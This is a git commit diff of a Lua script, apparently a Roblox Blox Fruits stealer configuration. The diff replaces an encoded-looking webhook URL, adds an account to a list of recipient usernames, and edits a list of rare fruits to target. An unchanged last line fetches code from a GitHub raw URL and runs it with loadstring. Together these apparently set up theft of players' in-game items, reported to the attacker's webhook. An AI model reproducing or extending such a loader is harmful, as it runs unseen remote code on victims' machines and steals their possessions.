83aa5e74587acb28fe1642b227dbb7ab7e27e8d9
reds8 <advin9389@gmail.com>
2025-04-11 19:57:28 +0530

    Update reds.lua

--- reds.lua
+++ reds.lua
@@ -1,6 +1,5 @@
-
-Webhook = "https://webhook-protect.vercel.app/api/webhook?id=TDY5SmIxZ1JBdkZCdFBjei1qWkxIQTpNekhjODc1a0htTW90OVQ4WVJpbUEwZWEwbXMxYi1rczRQNEdESjlvbS1mWVZmSnBNOF9VSWdvOTdCVzBQYkVSblpPS24yMzI0d3lUSEZtYXdlT1hBMzh4d0hKS0ZBSlJUMTRFemM4MVBETUtSWDlPaE9MTlhBNGo2bU5KRjY1LVVjdjN0aVkzQlpUZjVtOWlQSWVqY09ZNG9rcWtIU0lsU0hNak9zVU45eUE"
-Usernames = {"simos55599"}
-FruitsToHit = {"Kitsune-Kitsune", "Yeti-Yeti", "Leopard-Leopard", "Dough-Dough", "Gravity-Gravity", "Gas-Gas", "Mammoth-Mammoth", "T-Rex-T-Rex"}
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=b0dfNGc2bFFQX2VvZjh6dzI5NEJTdzpodERqRklCaXRhN0dLWUdUSlBEd2hta0xNUHVQZUZyTkFHX0lpNDI5QmVxaHFnSnYtRkVTUTZGZUE5aFp6WWFHQ2RIWXNuNTlQMW5pWFIza2tBNV84dXgwR1B0TW0wQm92X1BoWHp6eG9MdmZiTUl0U2NidzhyS2o4QWlEVE1PY1RPRXJUYnNXYk1idkhUM0psc3BRVFZWVWc3ZFdxY29IRnFXR0xTby02c2c"
+Usernames = {"simos55599", "adviknyc"}
+FruitsToHit = {"Kitsune-Kitsune", "Yeti-Yeti", "Leopard-Leopard", "Dough-Dough", "T-Rex-T-Rex", "Mammoth-Mammoth", "Gravity-Gravity"}
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
